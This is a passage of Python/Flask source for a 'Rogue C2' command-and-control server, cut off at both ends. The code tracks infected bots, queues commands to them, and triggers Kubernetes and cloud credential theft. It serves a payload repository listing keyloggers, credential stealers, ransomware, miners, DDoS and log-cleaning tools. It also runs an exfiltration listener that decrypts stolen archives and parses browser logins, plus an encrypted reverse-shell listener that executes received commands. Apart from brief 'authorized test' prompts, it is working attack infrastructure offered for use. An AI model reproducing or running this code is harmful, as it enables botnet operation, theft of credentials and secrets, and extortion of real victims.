            function sendCloudCommand(action) {
                var target = document.getElementById('cloud_target').value;
                if (!target) {
                    target = 'full';
                }
                
                var cmd = 'trigger_cloud_' + action + ' ' + target;
                
                var botId = selectedBotId();
                if (!botId) return;
                
                sendToBot(botId, cmd);
            }
            
            // Auto-refresh every 30 seconds
            setTimeout(() => location.reload(), 30000);
        </script>
    </body>
    </html>
    '''
    
    # Prepare bot list with time since last seen
    current_time = datetime.now()
    bot_list = []
    
    # Clean up old bots (not seen for 5 minutes)
    bots_to_remove = []
    for bot_id in list(connected_bots):
        if bot_id in bot_info:
            last_seen_str = bot_info[bot_id].get('last_seen')
            if last_seen_str:
                last_seen_time = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S')
                seconds_ago = int((current_time - last_seen_time).total_seconds())
                
                if seconds_ago > 300:  # 5 minutes
                    bots_to_remove.append(bot_id)
                else:
                    bot_list.append({
                        'id': bot_id,
                        'ip': bot_info[bot_id].get('ip', 'Unknown'),
                        'implant_id': bot_info[bot_id].get('implant_id', 'unknown'),
                        'last_seen': last_seen_str,
                        'last_seen_diff': seconds_ago,
                        'beacon_count': bot_info[bot_id].get('beacon_count', 0),
                        'commands_sent': bot_info[bot_id].get('commands_sent', 0),
                        'results_received': bot_info[bot_id].get('results_received', 0),
                        'cloud_info': bot_info[bot_id].get('cloud_info', {})
                    })
    
    # Remove old bots
    for bot_id in bots_to_remove:
        connected_bots.discard(bot_id)
        if bot_id in bot_info:
            del bot_info[bot_id]
    
    # Sort by most recent
    bot_list.sort(key=lambda x: x['last_seen_diff'])
    
    pending_count = sum(len(cmds) for cmds in pending_commands.values())
    
    # Public URL reflects the active outbound tunnel (set at startup) or
    # the local listener.
    public_url = ACTIVE_TUNNEL_URL if ACTIVE_TUNNEL_URL else f"http://localhost:{C2_PORT}"
    payload_url = f"{public_url}/payloads/"
    
    return render_template_string(admin_html,
        time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        bot_list=bot_list,
        bot_count=len(bot_list),
        results=command_results,
        pending_commands=pending_commands,
        pending_count=pending_count,
        public_url=public_url,
        payload_url=payload_url,
        c2_port=C2_PORT,
        exfil_port=EXFIL_PORT
    )

@app.route('/command', methods=['POST'])
def add_command():
    """Add command for a bot"""
    try:
        data = request.json
        beacon_id = data.get('beacon_id')
        command = data.get('command')
        
        if not beacon_id or not command:
            return jsonify({'error': 'Missing beacon_id or command'}), 400
        
        pending_commands[beacon_id].append(command)
        
        print(f"[+] Command queued for {beacon_id}: {command}")
        
        return jsonify({
            'status': 'queued',
            'command_id': f"cmd_{int(time.time())}_{len(pending_commands[beacon_id])}",
            'beacon_id': beacon_id
        })
        
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/k8s_command', methods=['POST'])
def k8s_command():
    """Send Kubernetes-specific command"""
    try:
        data = request.json
        beacon_id = data.get('beacon_id')
        command = data.get('command')
        namespace = data.get('namespace', 'default')
        secret = data.get('secret', '')
        
        if not beacon_id or not command:
            return jsonify({'error': 'Missing beacon_id or command'}), 400
        
        # Build the command
        if command == 'steal_all':
            actual_command = 'trigger_k8s_steal'
        elif command == 'targeted':
            actual_command = f'trigger_k8s_target {namespace}'
            if secret:
                actual_command += f' {secret}'
        elif command == 'creds':
            actual_command = 'trigger_k8s_creds'
        else:
            actual_command = command
        
        pending_commands[beacon_id].append(actual_command)
        
        print(f"[K8S] Kubernetes command queued for {beacon_id}: {actual_command}")
        
        return jsonify({
            'status': 'queued',
            'command': command,
            'actual_command': actual_command
        })
        
    except Exception as e:
        print(f"[-] Kubernetes command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/clear_pending/<bot_id>', methods=['POST'])
def clear_pending(bot_id):
    """Clear pending commands for a bot"""
    if bot_id in pending_commands:
        pending_commands[bot_id] = []
        print(f"[+] Cleared pending commands for {bot_id}")
        return jsonify({'status': 'cleared', 'bot_id': bot_id})
    return jsonify({'error': 'Bot not found'}), 404

@app.route('/beacons')
def list_beacons():
    """List all active beacons"""
    return jsonify({
        'beacons': list(connected_bots),
        'total': len(connected_bots),
        'server_time': datetime.now().isoformat()
    })

@app.route('/payloads/<path:filename>')
def serve_payload(filename):
    """Serve payload files directly from the payloads directory"""
    payload_dir = os.path.join(os.getcwd(), "payloads")
    file_path = os.path.join(payload_dir, filename)
    
    if os.path.exists(file_path) and os.path.isfile(file_path):
        # Check file extension for proper content type
        if filename.endswith('.py'):
            content_type = 'text/plain'
        else:
            content_type = 'application/octet-stream'
        
        with open(file_path, 'rb') as f:
            response = f.read()
        
        return response, 200, {'Content-Type': content_type}
    return "Payload not found", 404

@app.route('/payloads/')
def list_payloads():
    """List available payloads"""
    payload_dir = os.path.join(os.getcwd(), "payloads")
    files = []
    if os.path.exists(payload_dir):
        files = os.listdir(payload_dir)
    
    html = f"""
    <html>
    <head>
        <title>Rogue C2 Payload Repository</title>
        <style>
            body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }}
            h1 {{ color: #0f0; }}
            ul {{ list-style: none; padding: 0; }}
            li {{ margin: 10px 0; padding: 10px; background: #151515; border: 1px solid #333; }}
            a {{ color: #0ff; text-decoration: none; }}
            a:hover {{ color: #fff; text-decoration: underline; }}
            .payload-info {{ font-size: 12px; color: #888; margin-top: 5px; }}
            .warning {{ border: 2px solid #ff6600; background: #3a1a1a; }}
            .advanced {{ border: 2px solid #8a2be2; background: #1a1a3a; }}
            .cloud {{ border: 2px solid #2b8a8a; background: #1a2a3a; }}
            .k8s {{ border: 2px solid #326ce5; background: #1a1a3a; }}
        </style>
    </head>
    <body>
        <h1>Rogue C2 Payload Repository</h1>
        <p><strong>Total Payloads:</strong> {len([f for f in files if f.endswith('.py')])}</p>
        <p><strong>Advanced Payloads (NEW):</strong> 4</p>
        <p><strong>Cloud Payloads (NEW):</strong> 5</p>
        <p><strong>Kubernetes Payloads (NEW):</strong> 1 (k8s_secret_stealer.py)</p>
        <ul>
    """
    
    # Organize payloads by category
    payload_categories = {
        'Reconnaissance': ['sysrecon.py', 'network_scanner.py'],
        'Privilege Escalation': ['linpeas_light.py', 'persistence.py'],
        'Credential Access': ['hashdump.py', 'browserstealer.py'],
        'Collection': ['keylogger.py', 'screenshot.py'],
        'Defense Evasion': ['logcleaner.py', 'defense_evasion.py'],
        'Lateral Movement': ['sshspray.py', 'autodeploy.py', 'lateral_movement.py'],
        'Command & Control': ['dnstunnel.py'],
        'Impact': ['ddos.py', 'mine.py', 'fileransom.py'],
        'Persistence': ['polyloader.py'],
        'Advanced (NEW)': ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py'],
        'Cloud (NEW)': ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py'],
        'Kubernetes (NEW)': ['k8s_secret_stealer.py']
    }
    
    for category, payloads in payload_categories.items():
        html += f'<h2>{category}</h2>'
        for payload in payloads:
            if payload in files:
                if payload == 'fileransom.py':
                    warning_class = 'warning'
                elif payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py']:
                    warning_class = 'advanced'
                elif payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py']:
                    warning_class = 'cloud'
                elif payload == 'k8s_secret_stealer.py':
                    warning_class = 'k8s'
                else:
                    warning_class = ''
                
                html += f'''
                <li class="{warning_class}">
                    <a href="/payloads/{payload}">{payload}</a>
                    <div class="payload-info">
                        Size: {os.path.getsize(os.path.join(payload_dir, payload)) // 1024} KB | 
                        <a href="javascript:sendToAll(\\'load_payload {payload}\\')">Load</a> | 
                        <a href="javascript:sendToAll(\\'run_payload {payload}\\')">Run</a>
                        { ' | <span style="color:#8a2be2"> NEW</span>' if payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py'] else '' }
                        { ' | <span style="color:#2b8a8a"> CLOUD</span>' if payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py'] else '' }
                        { ' | <span style="color:#326ce5"> KUBERNETES</span>' if payload == 'k8s_secret_stealer.py' else '' }
                    </div>
                </li>
                '''
    
    html += """
        </ul>
        <script>
            function sendToAll(command) {
                if (command.includes('fileransom')) {
                    if (command.includes('system_destructive')) {
                        if (!confirm(' DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
                            return;
                        }
                    } else if (command.includes('system_aggressive')) {
                        if (!confirm(' Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
                            return;
                        }
                    } else {
                        if (!confirm(' File encryption payload is DESTRUCTIVE!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
                            return;
                        }
                    }
                }
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: 'all',
                        command: command
                    })
                }).then(() => alert('Command sent to load payload'));
            }
        </script>
    </body>
    </html>
    """
    
    return html

# ==================== EXFIL LISTENER ====================

def exfil_listener():
    """Exfiltration listener for encrypted data"""
    exfil_server = socket.socket()
    exfil_server.bind(('0.0.0.0', EXFIL_PORT))
    exfil_server.listen(5)
    print(f"[EXFIL] Listening on port {EXFIL_PORT} for incoming encrypted data...")

    while True:
        conn, addr = exfil_server.accept()
        print(f"[EXFIL] Receiving from {addr[0]}...")
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()

        raw_file = f"exfil_raw_{addr[0].replace('.', '_')}.bin"
        with open(raw_file, "wb") as f:
            f.write(data)
        print(f"[EXFIL] Raw dump saved: {raw_file}")

        try:
            if data.startswith(b"R2EX|"):
                plaintext = rv2c_exfil_open(data)
                if plaintext is None:
                    raise ValueError("R2EX open failed (not for this key)")
            else:
                nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
                cipher = AES.new(EXFIL_DECRYPT_KEY, AES.MODE_EAX, nonce)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_file = f"exfil_dec_{addr[0].replace('.', '_')}_{ts}.zip"
            with open(out_file, "wb") as f:
                f.write(plaintext)
            print(f"[EXFIL] Decrypted archive saved: {out_file}")

            extracted_dir = out_file + "_unzipped"
            with zipfile.ZipFile(out_file, 'r') as zip_ref:
                zip_ref.extractall(extracted_dir)

            for root, _, files in os.walk(extracted_dir):
                for file in files:
                    if file == "logins.json":
                        path = os.path.join(root, file)
                        print(f"\n Parsing Firefox logins.json: {path}")
                        with open(path, "r", encoding="utf-8") as f:
                            data = json.load(f)
                            for entry in data.get("logins", []):
                                print(f" - Site: {entry.get('hostname')}")
                                print(f"   Username (enc): {entry.get('encryptedUsername')}")
                                print(f"   Password (enc): {entry.get('encryptedPassword')}")
        except Exception as e:
            print(f"[!] Decryption failed: {e}")

# ============================================================================
# ROGUE V3.3 - C2 SERVER GLUE (uses the embedded RogueV2 core)
# ----------------------------------------------------------------------------
#  * automatic static-key bootstrap (rogue_keys/) + operator secret
#  * v2 frame handling on the main / endpoint (hello/session/op dispatch)
#  * mesh peer registry (labels learned from beacons/relays)
#  * R2EX encrypted exfil + encrypted reverse-shell sessions
# Legacy v1 framing remains supported on the same endpoint for older implants.
# ============================================================================

import json as _rv2c_json
import os as _rv2c_os
import time as _rv2c_time

RV2_KEYDIR = _rv2c_os.environ.get("ROGUE_KEYDIR") or _rv2c_os.path.join(_rv2c_os.getcwd(), "rogue_keys")


def rv2c_load_or_create_keys():
    """Load (secret, static_priv, static_pub) creating them on first run."""
    try:
        _rv2c_os.makedirs(RV2_KEYDIR, exist_ok=True)
        _rv2c_os.chmod(RV2_KEYDIR, 0o700)
    except Exception:
        pass
    secret_path = _rv2c_os.path.join(RV2_KEYDIR, "operator.secret")
    priv_path = _rv2c_os.path.join(RV2_KEYDIR, "static_priv.bin")
    pub_path = _rv2c_os.path.join(RV2_KEYDIR, "static_pub.b64")
    secret = _rv2c_os.environ.get("ROGUE_SECRET") or ""
    if not secret and _rv2c_os.path.exists(secret_path):
        secret = open(secret_path).read().strip()
    if not secret:
        secret = rv2_rand(32).hex()
        try:
            with open(secret_path, "w") as f:
                f.write(secret)
            _rv2c_os.chmod(secret_path, 0o600)
        except Exception:
            pass
    priv = pub = None
    if _rv2c_os.path.exists(priv_path) and _rv2c_os.path.exists(pub_path):
        priv = open(priv_path, "rb").read()
        pub = open(pub_path).read().strip()
    if not priv or not pub:
        priv, pub_raw = rv2_gen_static_key()
        pub = rv2_b64e(pub_raw) if pub_raw else ""
        try:
            with open(priv_path, "wb") as f:
                f.write(priv)
            with open(pub_path, "w") as f:
                f.write(pub)
            _rv2c_os.chmod(priv_path, 0o600)
        except Exception:
            pass
    return secret, priv, pub


RV2_SECRET, RV2_PRIV, RV2_PUB = rv2c_load_or_create_keys()
RV2_SERVER = RogueV2Server(RV2_SECRET, static_priv_raw=RV2_PRIV)
RV2_SESSIONS = {}      # label -> {"bot_id":..., "implant_id":..., "ip":..., "ts":...}
RV2_PEER_DB = {}       # label -> {"gw": bool, "ts": float}  (mesh members seen)
RV2_KEYS_PRINTED = False


def rv2c_print_banner():
    global RV2_KEYS_PRINTED
    if RV2_KEYS_PRINTED:
        return
    RV2_KEYS_PRINTED = True
    print("[V2] keys: %s" % RV2_KEYDIR)
    print("[V2] implant config snippet (embed in rogue_v2_config.py on targets):")
    print("    secret = '%s'" % RV2_SECRET)
    print("    static_pub = '%s'" % RV2_PUB)
    if RV2_PUB == "":
        print("    [i] no ECDH backend on server -> implants will use PSK mode p")


def rv2c_dispatch(op_str, client_ip, bot_id=None, implant_id=None, label=None):
    """Mirror of the legacy command handling for v2 sessions."""
    if op_str == "beacon":
        if bot_id is None:
            bot_id = get_bot_id(client_ip, implant_id or label or "unknown")
        connected_bots.add(bot_id)
        if bot_id not in bot_info:
            bot_info[bot_id] = {
                'ip': client_ip, 'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'beacon_count': 0, 'commands_sent': 0, 'results_received': 0,
                'implant_id': implant_id or label or 'unknown', 'cloud_info': {},
                'channel': 'v2'}
        else:
            bot_info[bot_id]['implant_id'] = implant_id or bot_info[bot_id].get('implant_id')
        bot_info[bot_id]['channel'] = 'v2'
        bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        bot_info[bot_id]['beacon_count'] += 1
        cmds = pending_commands.get(bot_id, [])
        if cmds:
            cmd = cmds.pop(0)
            bot_info[bot_id]['commands_sent'] += 1
            rv2c_event("command", bot_id, cmd[:60])
            print("[->] v2 command to %s: %s" % (bot_id, cmd))
            return cmd
        rv2c_event("beacon", bot_id, "pong")
        return "pong"

    if op_str.startswith("result:"):
        result = op_str.replace("result:", "", 1)
        if bot_id is None:
            bot_id = get_bot_id(client_ip, implant_id or label or "unknown")
            if bot_id not in bot_info:
                bot_info[bot_id] = {'ip': client_ip, 'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                    'beacon_count': 1, 'commands_sent': 0, 'results_received': 0,
                                    'implant_id': implant_id or 'unknown', 'cloud_info': {}}
        bot_info.setdefault(bot_id, {})['results_received'] = bot_info[bot_id].get('results_received', 0) + 1
        bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry = {'result': result[:2000], 'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                 'client_ip': client_ip, 'bot_id': bot_id, 'channel': 'v2'}
        command_results[bot_id].append(entry)
        if len(command_results[bot_id]) > 10:
            command_results[bot_id] = command_results[bot_id][-10:]
        rv2c_event("result", bot_id, result[:60])
        print("[v] v2 result from %s: %s" % (bot_id, result[:80]))
        return "result_received"

    if op_str.startswith("cloud_detected:"):
        try:
            cloud_data = json.loads(op_str.replace("cloud_detected:", "", 1))
        except Exception:
            cloud_data = {}
        if bot_id is None:
            bot_id = get_bot_id(client_ip, cloud_data.get('implant_id') or implant_id or label or "unknown")
        if bot_id not in bot_info:
            bot_info[bot_id] = {'ip': client_ip, 'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'beacon_count': 0, 'commands_sent': 0, 'results_received': 0,
                                'implant_id': cloud_data.get('implant_id', 'unknown'), 'cloud_info': {}}
        bot_info[bot_id]['cloud_info'] = cloud_data
        bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print("[CLOUD] v2 bot %s in %s" % (bot_id, cloud_data.get('provider', 'unknown')))
        return "cloud_info_received"

    return "Unknown command: %s" % op_str[:120]


def rv2c_handle_frame(raw, client_ip):
    """Process one raw v2 frame. Returns response wire bytes or None (drop)."""
    try:
        inner, label, is_new = RV2_SERVER.recv(raw, ip=client_ip)
    except Exception as e:
        print("[!] v2 frame rejected from %s: %s" % (client_ip, e))
        return None
    sess = RV2_SESSIONS.setdefault(label, {})
    sess['ts'] = time.time()
    sess['ip'] = client_ip
    op = inner.get("o", "")
    if op == "__hello__":
        implant_id = inner.get("id", "unknown")
        sess['implant_id'] = implant_id
        bot_id = get_bot_id(client_ip, implant_id)
        sess['bot_id'] = bot_id
        rv2c_event("hello", bot_id, "mode " + str(inner.get("m", "?")))
        print("[+] v2 implant hello: %s -> %s (mode %s)" % (implant_id, bot_id, inner.get("m", "?")))
        return RV2_SERVER.reply(label, {"o": "__hello_ack__", "bid": bot_id, "id": implant_id})
    bot_id = sess.get('bot_id')
    implant_id = sess.get('implant_id')
    # mesh bookkeeping from beacons
    mesh_info = inner.get("mesh") or {}
    if mesh_info:
        RV2_PEER_DB[label] = {"gw": bool(mesh_info.get("gw")), "ts": time.time()}
        if len(RV2_PEER_DB) > 200:
            now = time.time()
            for k in [k for k, v in RV2_PEER_DB.items() if now - v["ts"] > 900]:
                RV2_PEER_DB.pop(k, None)
    resp_str = rv2c_dispatch(op, client_ip, bot_id=bot_id, implant_id=implant_id, label=label)
    out = {"o": resp_str}
    if op == "beacon" and RV2_PEER_DB:
        # push a snapshot of known mesh members back (relay targets)
        now = time.time()
        out["peers"] = [l for l, v in RV2_PEER_DB.items() if now - v["ts"] < 600][:24]
    return RV2_SERVER.reply(label, out)


def rv2c_is_v2_frame(raw):
    try:
        return raw[:1] == b"{" and json.loads(raw.decode("utf-8", "replace")).get("v") == 2
    except Exception:
        return False


# ---------------- encrypted exfil (R2EX) ----------------
def rv2c_exfil_open(blob):
    """Open an R2EX exfil blob: R2EX|<eph pub b64>|<salt b64>|<nonce b64>|<tag>|<ct>"""
    if not blob.startswith(b"R2EX|"):
        return None
    parts = blob.split(b"|")
    if len(parts) != 6:
        return None
    _, eph_b64, salt_b64, nonce_b64, tag_b64, ct = parts
    if not RV2_PRIV:
        raise RuntimeError("no server ECDH key for exfil")
    eph = rv2_b64d(eph_b64)
    salt = rv2_b64d(salt_b64)
    shared = rv2_x25519_shared(RV2_PRIV, eph)
    # MUST match the implant seal derivation exactly (single kex pipe)
    master = rv2_hkdf(shared, salt, b"rogue-v2-kex|" + eph + rv2_b64d(RV2_PUB), 32)
    key = rv2_hkdf(master, b"", b"rogue-v2-exfil", 32)
    return rv2_aead_decrypt(key, rv2_b64d(nonce_b64), rv2_b64d(ct), rv2_b64d(tag_b64), b"rogue-v2-exfil")


# ---------------- encrypted reverse shell ----------------
def rv2c_shell_session(conn, addr):
    """Per-connection encrypted shell session (length-framed v2 frames)."""
    try:
        hello_wire = rv2_frame_recv(conn)
        if not hello_wire:
            return
        inner, label, is_new = RV2_SERVER.recv(hello_wire, ip=addr[0])
        if inner.get("o") != "__hello__":
            return
        sess = RV2_SESSIONS.setdefault(label, {})
        sess['shell'] = True
        sess['ip'] = addr[0]
        print("[SHELL] v2 session from %s (label %s)" % (addr[0], label[:12]))
        rv2_frame_send(conn, RV2_SERVER.reply(label, {"o": "__hello_ack__", "bid": sess.get('bot_id', 'op')}))
        while True:
            wire = rv2_frame_recv(conn)
            if wire is None:
                break
            try:
                inner = RV2_SERVER.recv(wire, ip=addr[0])[0]
            except Exception:
                break
            cmd = inner.get("o", "")
            if cmd in ("exit", "quit"):
                break
            try:
                out = subprocess.getoutput(cmd)
            except Exception as e:
                out = "[!] %s" % e
            try:
                rv2_frame_send(conn, RV2_SERVER.reply(label, {"o": out}))
            except Exception:
                break
    except Exception as e:
        print("[!] shell session error: %s" % e)
    finally:
        try:
            conn.close()
        except Exception:
            pass
        print("[SHELL] session closed from %s" % addr[0])


def rv2c_shell_listener():
    """Encrypted shell listener (port 9001) - requires rogue_shell.py client."""
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", 9001))
        srv.listen(10)
    except OSError as e:
        print("[!] shell listener bind failed: %s" % e)
        return
    print("[SHELL] v2 encrypted shell listening on 9001 (use scripts/rogue_shell.py)")
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            break
        threading.Thread(target=rv2c_shell_session, args=(conn, addr), daemon=True).start()


# ============================================================================
# ROGUE V3.3 - OPS DASHBOARD (/ops)
# ----------------------------------------------------------------------------
RV2_START = time.time()
RV2_EVENTS = []          # ring buffer of recent v2 activity


def rv2c_event(kind, bot, detail=""):
    RV2_EVENTS.append({"ts": time.time(), "kind": kind, "bot": bot, "detail": detail})
    if len(RV2_EVENTS) > 300:
        del RV2_EVENTS[:50]


def rv2c_bot_rows():
    """bot_info merged with v2 session/peer state for the dashboard."""
    rows = []
    now = datetime.now()
    for bid, info in bot_info.items():
        label = None
        mode = None
        for lbl, s in RV2_SESSIONS.items():
            if s.get("bot_id") == bid:
                label = lbl
                break
        last = info.get("last_seen", "")
        try:
            last_dt = datetime.strptime(last, "%Y-%m-%d %H:%M:%S")
            online = (now - last_dt).total_seconds() < 90
        except Exception:
            last_dt, online = None, False
        rows.append({
            "id": bid,
            "ip": info.get("ip"),
            "channel": info.get("channel", "v1"),
            "implant_id": info.get("implant_id"),
            "cloud": (info.get("cloud_info") or {}).get("provider", ""),
            "beacons": info.get("beacon_count", 0),
            "cmds": info.get("commands_sent", 0),
            "results": info.get("results_received", 0),
            "last_seen": last,
            "online": online,
            "label": label,
            "pending": len(pending_commands.get(bid, [])),
        })
    rows.sort(key=lambda r: (not r["online"], r["id"]))
    return rows


@app.route('/ops', methods=['GET'])
def ops_dashboard():
    return render_template_string(OPS_HTML)


@app.route('/ops/api', methods=['GET'])
def ops_api():
    now = time.time()
    peers = [{"label": l, "gw": bool(v.get("gw")), "age": int(now - v["ts"])}
             for l, v in RV2_PEER_DB.items()]
    events = [{"ts": time.time() - e["ts"], "kind": e["kind"], "bot": e["bot"],
               "detail": e["detail"][:120]} for e in RV2_EVENTS[-60:]][::-1]
    bots = rv2c_bot_rows()
    queued = sum(len(v) for v in pending_commands.values())
    return jsonify({
        "server": {
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "uptime_s": int(now - RV2_START),
            "v2": bool(RV2_PRIV),
            "keydir": RV2_KEYDIR,
            "pub": RV2_PUB[:20] + "..." if RV2_PUB else "",
        },
        "stats": {
            "bots_total": len(bots),
            "bots_online": sum(1 for b in bots if b["online"]),
            "peers": len(peers),
            "queued": queued,
            "results": sum(len(v) for v in command_results.values()),
        },
        "bots": bots,
        "peers": peers,
        "events": events,
    })


OPS_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ROGUE // OPS</title>
<style>
:root{--bg:#0a0e13;--panel:#111722;--line:#1e2a38;--fg:#c9d6e3;--dim:#5f7387;
--grn:#2ecc71;--red:#e74c3c;--amb:#f1c40f;--cyn:#35c8e8;--mag:#b06bff}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font:13px/1.45 "JetBrains Mono",Menlo,Consolas,monospace;padding:18px}
h1{font-size:15px;letter-spacing:4px;color:var(--cyn);text-transform:uppercase}
h1 span{color:var(--dim)}
.sub{color:var(--dim);font-size:11px;margin:4px 0 14px}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:14px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:10px 12px}
.card .n{font-size:22px;font-weight:700;color:var(--cyn)}
.card .l{color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1px}
.grid{display:grid;grid-template-columns:1fr 340px;gap:14px}
@media(max-width:1000px){.grid{grid-template-columns:1fr}}
.panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}
.panel h2{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--dim);
padding:8px 12px;border-bottom:1px solid var(--line);background:#0d1320}
table{width:100%;border-collapse:collapse}
th{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--dim);
text-align:left;padding:7px 10px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0d1320}
td{padding:6px 10px;border-bottom:1px solid #16202c;font-size:12px;white-space:nowrap}
tr:hover td{background:#141c2a}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
.dot.on{background:var(--grn);box-shadow:0 0 6px var(--grn)}
.dot.off{background:var(--red)}
.tag{font-size:10px;padding:1px 6px;border-radius:4px;border:1px solid var(--line);color:var(--dim)}
.tag.v2{color:var(--grn);border-color:#1f5c3d}
.tag.v1{color:var(--amb);border-color:#5c4a1f}
.tag.gw{color:var(--mag);border-color:#4a2f75}
td.b{max-width:220px;overflow:hidden;text-overflow:ellipsis}
.ev{font-size:11px;padding:4px 10px;border-bottom:1px solid #16202c;display:flex;gap:8px}
.ev .t{color:var(--dim)}
.ev .k{color:var(--cyn);text-transform:uppercase;font-size:9px;letter-spacing:1px;min-width:52px}
.ev .b{color:var(--mag);min-width:110px;overflow:hidden;text-overflow:ellipsis}
.console{display:flex;gap:8px;padding:10px}
.console input{flex:1;background:#0a0e13;border:1px solid var(--line);color:var(--fg);
padding:8px 10px;border-radius:6px;font:inherit}
.console select{background:#0a0e13;border:1px solid var(--line);color:var(--fg);
padding:8px;border-radius:6px;font:inherit}
button{background:#123c52;border:1px solid #1d5f80;color:#bfe9ff;padding:8px 14px;
border-radius:6px;font:inherit;cursor:pointer;letter-spacing:1px;text-transform:uppercase;font-size:11px}
button:hover{background:#17506e}
#toast{position:fixed;right:16px;bottom:16px;background:#0d2c1a;border:1px solid #1f5c3d;
color:var(--grn);padding:10px 14px;border-radius:6px;display:none;font-size:12px}
.empty{color:var(--dim);padding:14px;font-size:12px}
</style>
</head>
<body>
<h1>ROGUE <span>// OPS</span></h1>
<div class="sub" id="sub">connecting...</div>

<div class="cards">
  <div class="card"><div class="n" id="c_online">-</div><div class="l">Bots Online</div></div>
  <div class="card"><div class="n" id="c_total">-</div><div class="l">Bots Total</div></div>
  <div class="card"><div class="n" id="c_peers">-</div><div class="l">Mesh Peers</div></div>
  <div class="card"><div class="n" id="c_queued">-</div><div class="l">Cmds Queued</div></div>
  <div class="card"><div class="n" id="c_results">-</div><div class="l">Results</div></div>
  <div class="card"><div class="n" id="c_uptime">-</div><div class="l">Uptime</div></div>
</div>

<div class="grid">
  <div class="panel">
    <h2>Bots</h2>
    <table><thead><tr>
      <th>State</th><th>Bot</th><th>Channel</th><th>IP</th><th>Cloud</th>
      <th>Beacons</th><th>CMDs</th><th>Res</th><th>Last Seen</th>
    </tr></thead><tbody id="botrows"><tr><td colspan="9" class="empty">no beacons yet</td></tr></tbody></table>
  </div>
  <div>
    <div class="panel" style="margin-bottom:14px">
      <h2>Command Console</h2>
      <div class="console">
        <select id="cmd_bot"></select>
        <input id="cmd_text" placeholder="e.g. uname -a" autocomplete="off" spellcheck="false">
        <button onclick="sendCmd()">Send</button>
      </div>
      <div id="cmd_out" style="padding:0 10px 10px;color:var(--dim);font-size:11px"></div>
    </div>
    <div class="panel" style="margin-bottom:14px">
      <h2>Mesh Peers</h2>
      <div id="peers"><div class="empty">no mesh peers announced</div></div>
    </div>
    <div class="panel">
      <h2>Event Stream</h2>
      <div id="events"><div class="empty">no activity yet</div></div>
    </div>
  </div>
</div>
<div id="toast"></div>
<script>
const $=id=>document.getElementById(id);
function toast(m){const t=$("toast");t.textContent=m;t.style.display="block";setTimeout(()=>t.style.display="none",2500)}
function esc(s){return String(s==null?"":s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]))}
async function tick(){
  let d;
  try{d=await (await fetch("/ops/api",{cache:"no-store"})).json()}catch(e){return}
  $("sub").textContent="server "+d.server.time+" | v2 "+(d.server.v2?"enabled":"off")+" | "+d.server.pub;
  $("c_online").textContent=d.stats.bots_online; $("c_total").textContent=d.stats.bots_total;
  $("c_peers").textContent=d.stats.peers; $("c_queued").textContent=d.stats.queued;
  $("c_results").textContent=d.stats.results;
  const u=Math.floor(d.server.uptime_s/60); $("c_uptime").textContent=u+"m";
  const sel=$("cmd_bot"); const cur=sel.value;
  sel.innerHTML=""; d.bots.forEach(b=>{const o=document.createElement("option");o.value=b.id;
    o.textContent=b.id+(b.online?"":" (off)");sel.appendChild(o)});
  if(cur&&[...sel.options].some(o=>o.value===cur))sel.value=cur;
  const tb=$("botrows"); if(!d.bots.length){tb.innerHTML='<tr><td colspan="9" class="empty">no beacons yet</td></tr>';}
  else{tb.innerHTML=d.bots.map(b=>`<tr>
    <td><span class="dot ${b.online?"on":"off"}"></span></td>
    <td class="b" title="${esc(b.label||"")}">${esc(b.id)}</td>
